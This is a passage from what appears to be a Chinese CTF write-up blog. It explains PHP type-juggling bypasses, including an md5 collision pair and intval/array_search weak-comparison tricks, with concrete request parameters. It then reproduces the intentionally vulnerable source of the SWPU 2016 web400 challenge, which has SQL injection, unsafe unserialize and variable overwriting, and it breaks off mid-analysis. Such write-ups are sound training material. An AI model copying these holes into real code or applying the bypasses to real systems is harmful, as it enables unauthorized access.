class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$checker_1</span> &amp;&amp; <span class="variable">$checker_2</span> &amp;&amp; <span class="variable">$checker_3</span> &amp;&amp; <span class="variable">$checker_4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rce</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先看num：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能匹配到数字，intval后又要等于1.</p><p>可以用非空数组绕过，?num[]&#x3D;1这里的1不会被正则匹配到。</p><p>然后看这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5绕过，找一个纯字母的和一个纯数字的反一下就好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctype=YcGyb&amp;is_num=807016042</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>?114&#x3D;1e9&amp;514&#x3D;99999999999a即可。</p><p>最后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组中不能匹配到NSS且数组的值被intval过了，不可能为NSS。此处有一个array_search，是弱比较，0&#x3D;&#x3D;0绕过即可，NSS与数字比较时为0.因此array[]&#x3D;0即可。索引也是0，符合。</p><h2 id="SWPU-2016-web400"><a href="#SWPU-2016-web400" class="headerlink" title="[SWPU 2016]web400"></a>[SWPU 2016]web400</h2><p>源码没有给，只能去wp里面找了。</p><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&quot;_POST&quot;</span>,<span class="string">&quot;_GET&quot;</span>,<span class="string">&quot;_COOKIE&quot;</span>) <span class="keyword">as</span> <span class="variable">$key</span>)&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$$key</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$v</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hello,hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$k</span>[<span class="number">0</span>] !=<span class="string">&#x27;_&#x27;</span>?<span class="variable">$$k</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$v</span>):<span class="variable">$$k</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>riji.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] !== <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">                <span class="variable">$sql1</span> = <span class="string">&quot;select * from msg where userid= <span class="subst">$id</span> order by id&quot;</span>;</span><br><span class="line">                <span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>);</span><br><span class="line">                <span class="variable">$result1</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$temp</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$query</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result1</span>[]=<span class="variable">$temp</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$result1</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$o</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">display</span>(<span class="variable">$o</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;common.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$msgid</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">        <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === <span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>] . <span class="variable">$this</span>-&gt;data . <span class="variable">$username</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;(=-=)!!&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_method</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>() === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_msg&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_msg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_user&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_user</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_msg</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;msgid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;msgid);</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql1</span> = <span class="string">&quot;DELETE FROM msg where id=&#x27;<span class="subst">$msg_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your msg_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_user</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;userid)&#123;</span><br><span class="line">            <span class="variable">$user_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;userid);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_id</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Admin can\&#x27;t delete!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql2</span> = <span class="string">&quot;DELETE FROM user where userid=&#x27;<span class="subst">$user_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your user_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$api</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">do_method</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$login</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;passwd&#x27;</span>] == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$user_cookie</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>];</span><br><span class="line">            <span class="variable">$cookies</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">            <span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookies</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&#x27;/web/&#x27;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Password Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>forget.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$forget</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$check</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>]));</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:/web/repass.php?username=<span class="subst">$name</span>&amp;check=<span class="subst">$check</span>&amp;mibao=<span class="subst">$mibao</span>&amp;pass=<span class="subst">$pass</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Get salt Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Please check!!?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先来捋一下思路：riji.php中存在sql注入的点也就是id，但是id在之前被赋值了，有没有办法让他不进入if呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    